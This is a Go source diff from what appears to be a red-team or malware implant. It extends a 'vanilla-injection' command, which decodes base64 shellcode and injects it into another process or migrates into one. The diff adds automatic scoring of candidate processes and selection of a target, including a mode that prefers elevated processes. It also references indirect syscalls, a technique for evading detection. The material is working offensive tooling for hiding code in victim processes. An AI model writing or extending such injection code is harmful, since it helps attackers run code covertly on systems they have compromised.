@@ -83,8 +83,9 @@ func (c *VanillaInjectionCommand) Description() string {
 // VanillaInjectionParams represents the parameters for vanilla-injection
 type VanillaInjectionParams struct {
 	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
-	PID          int    `json:"pid"`           // Target process ID
+	PID          int    `json:"pid"`           // Target process ID (0 if using target mode)
 	Action       string `json:"action"`        // "inject" (default) or "migrate"
+	Target       string `json:"target"`        // "auto", "auto-elevated", "auto-user" (overrides PID)
 }
 
 // isMigrateAction returns true if the action is a process migration.
@@ -109,10 +110,6 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 		return errorResult("Error: No shellcode data provided")
 	}
 
-	if params.PID <= 0 {
-		return errorResult("Error: Invalid PID specified")
-	}
-
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
 		return errorf("Error decoding shellcode: %v", err)
@@ -123,6 +120,36 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 	}
 
 	output := fmt.Sprintf("[*] Received shellcode: %d bytes\n", len(shellcode))
+
+	// Auto-select target if target mode is specified
+	if params.Target != "" {
+		mode := TargetMode(strings.ToLower(params.Target))
+		targets, terr := SelectInjectionTarget(mode)
+		if terr != nil {
+			return errorf("Target selection failed: %v", terr)
+		}
+		output += fmt.Sprintf("[*] Target selection mode: %s\n", mode)
+		output += fmt.Sprintf("[*] Evaluated %d candidate processes:\n", len(targets))
+		for i, t := range targets {
+			marker := "  "
+			if i == 0 {
+				marker = ">>"
+			}
+			output += fmt.Sprintf("  %s PID %d %-25s score=%d [%s]\n",
+				marker, t.PID, t.Name, t.Score, strings.Join(t.Reasons, ", "))
+		}
+		bestPID, berr := BestTarget(targets)
+		if berr != nil {
+			return errorf("No suitable target: %v", berr)
+		}
+		params.PID = int(bestPID)
+		output += fmt.Sprintf("[+] Selected: PID %d (%s)\n", bestPID, targets[0].Name)
+	}
+
+	if params.PID <= 0 {
+		return errorResult("Error: Invalid PID specified (provide pid or target mode)")
+	}
+
 	output += fmt.Sprintf("[*] Target PID: %d\n", params.PID)
 
 	if IndirectSyscallsAvailable() {
